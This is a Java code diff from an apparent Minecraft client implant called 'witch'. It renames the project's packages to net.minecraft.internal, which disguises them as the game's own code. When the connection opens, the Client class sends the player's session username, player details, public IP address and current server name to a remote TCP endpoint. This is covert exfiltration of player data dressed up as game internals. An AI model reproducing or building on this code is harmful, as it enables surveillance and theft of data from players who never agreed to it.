@@ -1,17 +1,15 @@
-package me.soda.witch.client.connection;
+package net.minecraft.internal.connection;
 
-import me.soda.witch.client.Witch;
-import me.soda.witch.client.events.ConnectionMessageEvent;
-import me.soda.witch.client.utils.MCUtils;
-import me.soda.witch.client.utils.NetUtil;
+import net.minecraft.internal.Witch;
+import net.minecraft.internal.events.ConnectionMessageEvent;
+import net.minecraft.internal.utils.MCUtils;
+import me.soda.witch.shared.NetUtil;
 import me.soda.witch.shared.Cfg;
 import me.soda.witch.shared.LogUtil;
 import me.soda.witch.shared.events.EventBus;
 import me.soda.witch.shared.socket.TcpClient;
 import me.soda.witch.shared.socket.messages.DisconnectInfo;
 import me.soda.witch.shared.socket.messages.Message;
-
-import static me.soda.witch.client.Witch.mc;
 
 public class Client extends TcpClient {
     public int reconnections = 0;
@@ -36,11 +34,11 @@ public class Client extends TcpClient {
     @Override
     public void onOpen() {
         LogUtil.println("Connection initialized");
-        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
-        NetUtil.send("greeting", greetingMsg);
-        NetUtil.send("player", MCUtils.getPlayerInfo());
-        NetUtil.send("ip", NetUtil.httpSend("https://ifconfig.me/"));
-        NetUtil.send("server_name");
+        String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + Witch.mc.getSession().getUsername();
+        Witch.send("greeting", greetingMsg);
+        Witch.send("player", MCUtils.getPlayerInfo());
+        Witch.send("ip", NetUtil.getIP());
+        Witch.send("server_name");
     }
 
     @Override
